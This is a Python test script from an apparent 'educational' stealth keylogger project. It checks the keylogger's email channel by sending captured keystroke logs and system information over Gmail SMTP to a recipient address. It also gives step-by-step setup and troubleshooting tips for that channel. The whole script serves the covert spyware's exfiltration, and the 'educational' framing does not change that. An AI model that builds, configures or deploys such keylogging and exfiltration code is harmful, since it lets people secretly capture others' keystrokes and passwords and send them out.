#!/usr/bin/env python3
"""
Email Test Script for Educational Keylogger
===========================================

This script tests the email functionality of the keylogger
without running the full keylogger application.

Usage:
    python test_email.py [config_file]
    
Example:
    python test_email.py examples/email_demo_config.json
"""

import sys
import os
from pathlib import Path

# Add project root to path (go up one directory from tests/)
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

def test_email_config():
    """Test email configuration and send a test email"""
    
    config_file = sys.argv[1] if len(sys.argv) > 1 else "examples/email_demo_config.json"
    
    print("🧪 Educational Keylogger Email Test")
    print("=" * 40)
    print(f"📁 Using config: {config_file}")
    
    if not os.path.exists(config_file):
        print(f"❌ Configuration file not found: {config_file}")
        print("💡 Available example configs:")
        examples_dir = Path("examples")
        if examples_dir.exists():
            for config in examples_dir.glob("*.json"):
                print(f"   - {config}")
        return False
    
    try:
        # Import keylogger
        from src.core.keylogger import StealthKeylogger
        
        print("📧 Initializing keylogger with email config...")
        keylogger = StealthKeylogger(config_file)
        
        # Check if email is enabled
        if not keylogger.config.get('transmission', {}).get('enabled', False):
            print("❌ Email transmission is disabled in configuration")
            print("💡 Enable it by setting transmission.enabled = true")
            return False
            
        if not keylogger.config.get('email', {}).get('enabled', False):
            print("❌ Email is disabled in configuration")
            print("💡 Enable it by setting email.enabled = true")
            return False
        
        # Check email configuration
        email_config = keylogger.config.get('email', {})
        sender_email = email_config.get('sender_email', '')
        
        if not sender_email or sender_email == 'your_email@gmail.com':
            print("❌ Please configure your email settings:")
            print("   - sender_email: Your email address")
            print("   - sender_password: Your app password (not regular password)")
            print("   - recipient_email: Destination email")
            print("")
            print("📖 See docs/EMAIL_SETUP.md for detailed instructions")
            return False
        
        print(f"📤 Sender: {sender_email}")
        print(f"📥 Recipient: {email_config.get('recipient_email', 'Not set')}")
        print(f"🌐 SMTP Server: {email_config.get('smtp_server', 'Not set')}")
        
        # Create some test log data
        print("📝 Creating test log data...")
        keylogger.captured_data = [
            "Test message for email functionality",
            "This is an educational test",
            "Keylogger email system working!"
        ]
        
        # Send test email
        print("📧 Sending test email...")
        try:
            result = keylogger.send_email_report()
            
            if result:
                print("✅ Test email sent successfully!")
                print("📬 Check your inbox (and spam folder)")
                print("📊 Email should contain test log data and system info")
            else:
                print("❌ Failed to send test email")
                print("🔍 Check your email configuration:")
                print("   - Email address and app password")
                print("   - Internet connection")
                print("   - SMTP server settings")
            
            return result
            
        except Exception as email_error:
            print(f"❌ Email error details: {email_error}")
            print(f"🔍 Error type: {type(email_error).__name__}")
            
            # Provide specific guidance based on error type
            error_str = str(email_error).lower()
            if "authentication" in error_str or "password" in error_str:
                print("🔐 Authentication Issue:")
                print("   - Make sure you're using Gmail App Password (not regular password)")
                print("   - Enable 2-factor authentication first")
                print("   - Generate new App Password if needed")
            elif "connection" in error_str or "network" in error_str:
                print("🌐 Connection Issue:")
                print("   - Check internet connection")
                print("   - Verify SMTP server and port (smtp.gmail.com:587)")
                print("   - Check firewall settings")
            elif "tls" in error_str or "ssl" in error_str:
                print("🔒 TLS/SSL Issue:")
                print("   - Make sure use_tls is set to true")
                print("   - Try port 465 with SSL instead of 587 with TLS")
            
            return False
        
    except ImportError as e:
        print(f"❌ Import error: {e}")
        print("💡 Make sure all dependencies are installed:")
        print("   pip install -r requirements.txt")
        return False
        
    except Exception as e:
        print(f"❌ Error: {e}")
        print("🔍 Check your configuration file and network connection")
        return False

def show_email_setup_tips():
    """Show quick email setup tips"""
    print("\n📖 Quick Email Setup Tips:")
    print("=" * 30)
    print("1. For Gmail:")
    print("   - Enable 2-factor authentication")
    print("   - Generate App Password (not regular password)")
    print("   - Use smtp.gmail.com:587")
    print("")
    print("2. Configuration example:")
    print('   "sender_email": "your@gmail.com",')
    print('   "sender_password": "abcd efgh ijkl mnop",  # App password')
    print('   "recipient_email": "recipient@gmail.com"')
    print("")
    print("3. Test with short interval:")
    print('   "interval_hours": 0.1  # 6 minutes for testing')
    print("")
    print("📋 Full guide: docs/EMAIL_SETUP.md")

if __name__ == "__main__":
    try:
        success = test_email_config()
        if not success:
            show_email_setup_tips()
    except KeyboardInterrupt:
        print("\n🛑 Test interrupted by user")
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
        show_email_setup_tips()